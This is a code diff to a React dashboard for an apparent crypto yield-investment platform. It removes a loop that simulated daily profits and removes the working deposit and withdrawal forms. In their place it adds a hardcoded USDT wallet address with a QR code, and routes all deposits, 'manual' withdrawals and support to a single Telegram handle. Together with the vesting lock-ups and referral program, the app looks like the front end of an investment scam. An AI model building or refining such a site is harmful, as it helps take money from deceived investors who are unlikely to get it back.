@@ -31,11 +31,11 @@
                     },
                     colors: {
                         brand: {
-                            50: '#eff6ff',
-                            100: '#dbeafe',
-                            500: '#3b82f6',
-                            600: '#2563eb',
-                            900: '#1e3a8a',
+                            50: '#ecfdf5',
+                            100: '#d1fae5',
+                            500: '#10b981',
+                            600: '#059669',
+                            900: '#064e3b',
                         }
                     },
                     animation: {
@@ -334,43 +334,6 @@
                 setBalance(currentBal);
                 setChartHistory(initialHistory);
 
-                // Start Live Simulation Loop
-                const interval = setInterval(() => {
-                    setCurrentDay(prevDay => {
-                        const newDay = prevDay + 1;
-                        const cycleDay = (newDay - 1) % 33;
-                        
-                        setActiveContracts(contracts => {
-                            const activePrincipal = contracts.reduce((sum, c) => sum + c.amount, 0);
-                            setYieldCurve(prevCurve => {
-                                const activeCurve = cycleDay === 0 ? generate33DayCurve() : prevCurve;
-                                const generatedProfit = activePrincipal * activeCurve[cycleDay];
-                                
-                                setDailyProfit(generatedProfit);
-                                setTotalProfit(prevTotal => prevTotal + generatedProfit);
-                                setBalance(prevBalance => {
-                                    const newBal = prevBalance + generatedProfit;
-                                    setChartHistory(prevHist => [...prevHist, { day: newDay, balance: newBal, profit: generatedProfit }].slice(-30));
-                                    return newBal;
-                                });
-                                
-                                setRecentTrades(prevTrades => [{
-                                    id: `day-${newDay}`,
-                                    pair: `Yield Cycle - Day ${cycleDay + 1}/33`,
-                                    type: 'YIELD DIST',
-                                    profit: generatedProfit,
-                                    date: new Date()
-                                }, ...prevTrades].slice(0, 10));
-                                
-                                return activeCurve;
-                            });
-                            return contracts;
-                        });
-                        return newDay;
-                    });
-                }, 8000); // Update every 8 seconds to simulate daily tick
-
-                return () => clearInterval(interval);
             }, []);
 
             const handleDeposit = (amount) => {
@@ -422,6 +385,7 @@
                 { id: 'wallet', label: 'Transfers & Activity', icon: 'fa-wallet' },
                 { id: 'referrals', label: 'Partner Program', icon: 'fa-users' },
                 { id: 'profile', label: 'Account Settings', icon: 'fa-user-circle' },
+                { id: 'support', label: 'Help & Support', icon: 'fa-headset' },
             ];
 
             return (
@@ -542,6 +506,7 @@
                                         {activeTab === 'wallet' && 'Manage your liquidity, view transaction history, and initiate secure transfers.'}
                                         {activeTab === 'referrals' && 'Invite eligible clients to earn institutional yield bonuses continuously.'}
                                         {activeTab === 'profile' && 'Manage your profile, security preferences, and compliance status.'}
+                                        {activeTab === 'support' && 'Get in touch with our Telegram support team for assistance.'}
                                     </p>
                                 </div>
                                 
@@ -592,6 +557,7 @@
                                 )}
                                 {activeTab === 'referrals' && <ReferralView />}
                                 {activeTab === 'profile' && <ProfileView />}
+                                {activeTab === 'support' && <SupportView />}
                             </div>
                         </div>
                     </main>
@@ -600,13 +566,10 @@
                     <DepositModal 
                         isOpen={isDepositModalOpen} 
                         onClose={() => setIsDepositModalOpen(false)} 
-                        onConfirm={handleDeposit} 
-                        availableAmount={availableAmount}
                     />
                     <WithdrawModal 
                         isOpen={isWithdrawModalOpen} 
                         onClose={() => setIsWithdrawModalOpen(false)} 
-                        onConfirm={handleWithdraw}
                         availableAmount={availableAmount}
                         lockedAmount={lockedAmount}
                     />
@@ -1054,24 +1017,52 @@
             );
         }
 
-        function DepositModal({ isOpen, onClose, onConfirm, availableAmount }) {
-            const [amount, setAmount] = useState('');
-            const [isProcessing, setIsProcessing] = useState(false);
+        function SupportView() {
+            return (
+                <div className="max-w-3xl mx-auto animate-fade-in-up">
+                    <div className="glass border border-slate-200/50 dark:border-slate-700/50 rounded-3xl overflow-hidden shadow-lg p-8 md:p-12 text-center relative">
+                        <div className="absolute top-0 right-0 w-40 h-40 bg-brand-500/10 rounded-full blur-3xl"></div>
+                        <div className="inline-flex p-5 bg-brand-50 dark:bg-brand-900/30 rounded-2xl mb-6 shadow-inner border border-brand-100 dark:border-brand-800">
+                            <i className="fab fa-telegram-plane text-5xl text-brand-500 animate-float"></i>
+                        </div>
+                        <h2 className="text-3xl md:text-4xl font-bold text-slate-900 dark:text-white mb-4 tracking-tight">Need Assistance?</h2>
+                        <p className="text-slate-500 dark:text-slate-400 max-w-xl mx-auto mb-10 text-lg">
+                            Our dedicated support team is available 24/7 via Telegram to help you with deposits, withdrawals, and account management.
+                        </p>
+                        <a 
+                            href="https://t.me/elmetadora" 
+                            target="_blank" 
+                            rel="noopener noreferrer"
+                            className="inline-flex items-center space-x-3 px-8 py-4 bg-[#0088cc] hover:bg-[#0077b5] text-white font-bold rounded-xl shadow-lg transition-all hover:-translate-y-1"
+                        >
+                            <i className="fab fa-telegram-plane text-xl"></i>
+                            <span>Contact @elmetadora</span>
+                        </a>
+                    </div>
+                </div>
+            );
+        }
+
+        function DepositModal({ isOpen, onClose }) {
+            const [copied, setCopied] = useState(false);
+            const depositAddress = "0xabb2237b3fff75eb90f515e5b8487077105546c9";
 
             if (!isOpen) return null;
 
-            const handleSubmit = (e) => {
-                e.preventDefault();
-                const val = parseFloat(amount);
-                if (val > 0) {
-                    setIsProcessing(true);
-                    setTimeout(() => {
-                        onConfirm(val);
-                        setIsProcessing(false);
-                        setAmount('');
-                        onClose();
-                    }, 1200); 
-                }
+            const copyToClipboard = () => {
+                navigator.clipboard.writeText(depositAddress).then(() => {
+                    setCopied(true);
+                    setTimeout(() => setCopied(false), 2000);
+                }).catch(err => {
+                    const textArea = document.createElement("textarea");
+                    textArea.value = depositAddress;
+                    document.body.appendChild(textArea);
+                    textArea.select();
+                    document.execCommand("copy");
+                    document.body.removeChild(textArea);
+                    setCopied(true);
+                    setTimeout(() => setCopied(false), 2000);
+                });
             };
 
             return (
@@ -1087,70 +1078,49 @@
                                 </button>
                             </div>
 
-                            <form onSubmit={handleSubmit} className="space-y-6">
-                                <div className="space-y-2">
-                                    <label className="text-sm font-bold text-slate-700 dark:text-slate-300">Amount (USDT)</label>
-                                    <div className="relative">
-                                        <span className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-500 font-bold text-lg">₮</span>
-                                        <input 
-                                            type="number" 
-                                            required
-                                            min="100"
-                                            step="100"
-                                            value={amount}
-                                            onChange={(e) => setAmount(e.target.value)}
-                                            placeholder="1,000"
-                                            className="w-full bg-slate-50 dark:bg-slate-800 border border-slate-300 dark:border-slate-700 focus:border-brand-500 dark:focus:border-brand-500 focus:ring-2 focus:ring-brand-500/20 rounded-xl pl-10 pr-4 py-3 text-slate-900 dark:text-white placeholder-slate-400 outline-none transition-shadow text-xl font-bold"
-                                        />
+                            <div className="space-y-6">
+                                <div className="text-center p-6 bg-slate-50 dark:bg-slate-800/50 rounded-2xl border border-slate-200 dark:border-slate-700">
+                                    <div className="bg-white p-3 rounded-xl inline-block shadow-sm mb-4">
+                                        <img src={`https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${depositAddress}`} alt="QR Code" className="w-32 h-32" />
                                     </div>
-                                    <p className="text-xs text-slate-500 dark:text-slate-400 font-medium">Minimum deposit: 100.00 USDT</p>
-                                </div>
-
-                                <div className="bg-brand-50 dark:bg-brand-900/20 border border-brand-100 dark:border-brand-800/50 rounded-xl p-5 flex items-start space-x-4">
-                                    <i className="fas fa-lock text-brand-500 text-lg mt-0.5"></i>
-                                    <div className="text-sm text-brand-900 dark:text-brand-200 leading-relaxed w-full">
-                                        <span className="font-bold">Dynamic Vesting Terms:</span>
-                                        <ul className="mt-2 space-y-1 font-medium opacity-90">
-                                            <li className="flex items-center"><i className="fas fa-circle text-[6px] mr-2"></i> 5 Months (≥ 5,000 USDT)</li>
-                                            <li className="flex items-center"><i className="fas fa-circle text-[6px] mr-2"></i> 8 Months (1,000 - 4,999 USDT)</li>
-                                            <li className="flex items-center"><i className="fas fa-circle text-[6px] mr-2"></i> 12 Months (&lt; 1,000 USDT)</li>
-                                        </ul>
+                                    <p className="text-sm text-slate-500 dark:text-slate-400 mb-2 font-medium">Send USDT to this address:</p>
+                                    
+                                    <div className="flex items-center bg-slate-200 dark:bg-slate-900 rounded-lg p-1 border border-slate-300 dark:border-slate-700 overflow-hidden">
+                                        <code className="text-xs text-slate-800 dark:text-slate-300 px-3 py-2 truncate flex-1 font-mono">{depositAddress}</code>
+                                        <button 
+                                            onClick={copyToClipboard}
+                                            className={`px-4 py-2 rounded-md text-xs font-bold transition-colors ${copied ? 'bg-emerald-500 text-white' : 'bg-brand-500 text-white hover:bg-brand-600'}`}
+                                        >
+                                            {copied ? 'Copied!' : 'Copy'}
+                                        </button>
                                     </div>
                                 </div>
 
-                                <button 
-                                    type="submit" 
-                                    disabled={isProcessing || !amount || parseFloat(amount) < 100}
-                                    className="w-full py-4 bg-slate-900 dark:bg-brand-600 hover:bg-slate-800 dark:hover:bg-brand-500 text-white font-bold rounded-xl shadow-lg transition-all flex justify-center items-center disabled:opacity-50 disabled:cursor-not-allowed hover:-translate-y-0.5"
+                                <div className="bg-amber-50 dark:bg-amber-900/20 border border-amber-200 dark:border-amber-800/50 rounded-xl p-4 flex items-start space-x-3">
+                                    <i className="fas fa-exclamation-triangle text-amber-500 mt-0.5"></i>
+                                    <p className="text-xs text-amber-800 dark:text-amber-200 leading-relaxed font-medium">
+                                        After transferring funds, please contact our support team on Telegram with your transaction details to expedite crediting to your account.
+                                    </p>
+                                </div>
+
+                                <a 
+                                    href="https://t.me/elmetadora" 
+                                    target="_blank" 
+                                    rel="noopener noreferrer"
+                                    className="w-full py-4 bg-[#0088cc] hover:bg-[#0077b5] text-white font-bold rounded-xl shadow-lg transition-all flex justify-center items-center hover:-translate-y-0.5 space-x-2"
                                 >
-                                    {isProcessing ? <i className="fas fa-circle-notch fa-spin text-xl"></i> : 'Execute Deposit'}
-                                </button>
-                            </form>
+                                    <i className="fab fa-telegram-plane text-xl"></i>
+                                    <span>Notify Support via Telegram</span>
+                                </a>
+                            </div>
                         </div>
                     </div>
                 </div>
             );
         }
 
-        function WithdrawModal({ isOpen, onClose, onConfirm, availableAmount, lockedAmount }) {
-            const [amount, setAmount] = useState('');
-            const [isProcessing, setIsProcessing] = useState(false);
-
+        function WithdrawModal({ isOpen, onClose, availableAmount, lockedAmount }) {
             if (!isOpen) return null;
-
-            const handleSubmit = (e) => {
-                e.preventDefault();
-                const val = parseFloat(amount);
-                if (val > 0 && val <= availableAmount) {
-                    setIsProcessing(true);
-                    setTimeout(() => {
-                        onConfirm(val);
-                        setIsProcessing(false);
-                        setAmount('');
-                        onClose();
-                    }, 1200); 
-                }
-            };
 
             return (
                 <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-slate-900/60 backdrop-blur-sm animate-fade-in-up" style={{ animationDuration: '0.2s' }}>
@@ -1165,11 +1135,11 @@
                                 </button>
                             </div>
 
-                            <form onSubmit={handleSubmit} className="space-y-6">
+                            <div className="space-y-6">
                                 <div className="bg-slate-50 dark:bg-slate-800/80 border border-slate-200 dark:border-slate-700 rounded-xl p-5 mb-2">
                                     <div className="flex justify-between items-center mb-3">
                                         <span className="text-sm text-slate-500 dark:text-slate-400 font-bold uppercase tracking-wide">Available Liquid</span>
-                                        <span className="text-xl font-bold text-emerald-600 dark:text-emerald-400">{formatCurrency(availableAmount)}</span>
+                                        <span className="text-xl font-bold text-brand-600 dark:text-brand-400">{formatCurrency(availableAmount)}</span>
                                     </div>
                                     <div className="h-px w-full bg-slate-200 dark:bg-slate-700 mb-3"></div>
                                     <div className="flex justify-between items-center">
@@ -1178,36 +1148,26 @@
                                     </div>
                                 </div>
 
-                                <div className="space-y-2">
-                                    <label className="text-sm font-bold text-slate-700 dark:text-slate-300">Amount (USDT)</label>
-                                    <div className="relative">
-                                        <span className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-500 font-bold text-lg">₮</span>
-                                        <input 
-                                            type="number" 
-                                            required
-                                            min="10"
-                                            max={availableAmount}
-                                            step="10"
-                                            value={amount}
-                                            onChange={(e) => setAmount(e.target.value)}
-                                            placeholder="0.00"
-                                            className="w-full bg-slate-50 dark:bg-slate-800 border border-slate-300 dark:border-slate-700 focus:border-emerald-500 dark:focus:border-emerald-500 focus:ring-2 focus:ring-emerald-500/20 rounded-xl pl-10 pr-4 py-3 text-slate-900 dark:text-white placeholder-slate-400 outline-none transition-shadow text-xl font-bold"
-                                        />
+                                <div className="text-center py-4">
+                                    <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-brand-50 dark:bg-brand-900/30 text-brand-500 mb-4">
+                                        <i className="fas fa-headset text-2xl"></i>
                                     </div>
-                                    <div className="flex justify-between">
-                                        <p className="text-xs text-slate-500 dark:text-slate-400 font-medium">Network fee: 1.00 USDT</p>
-                                        <button type="button" onClick={() => setAmount(availableAmount)} className="text-xs font-bold text-brand-600 dark:text-brand-400 hover:underline">MAX</button>
-                                    </div>
+                                    <h4 className="text-lg font-bold text-slate-900 dark:text-white mb-2">Manual Withdrawal</h4>
+                                    <p className="text-sm text-slate-500 dark:text-slate-400 px-4">
+                                        To ensure the highest security of client funds, all withdrawal requests are processed manually by our financial department.
+                                    </p>
                                 </div>
 
-                                <button 
-                                    type="submit" 
-                                    disabled={isProcessing || !amount || parseFloat(amount) > availableAmount || availableAmount <= 0}
-                                    className="w-full py-4 bg-slate-900 dark:bg-white hover:bg-slate-800 dark:hover:bg-slate-100 text-white dark:text-slate-900 font-bold rounded-xl shadow-lg transition-all flex justify-center items-center disabled:opacity-50 disabled:cursor-not-allowed hover:-translate-y-0.5"
+                                <a 
+                                    href="https://t.me/elmetadora" 
+                                    target="_blank" 
+                                    rel="noopener noreferrer"
+                                    className="w-full py-4 bg-[#0088cc] hover:bg-[#0077b5] text-white font-bold rounded-xl shadow-lg transition-all flex justify-center items-center hover:-translate-y-0.5 space-x-2"
                                 >
-                                    {isProcessing ? <i className="fas fa-circle-notch fa-spin text-xl"></i> : 'Confirm Withdrawal'}
-                                </button>
-                            </form>
+                                    <i className="fab fa-telegram-plane text-xl"></i>
+                                    <span>Request via Telegram (@elmetadora)</span>
+                                </a>
+                            </div>
                         </div>
                     </div>
                 </div>
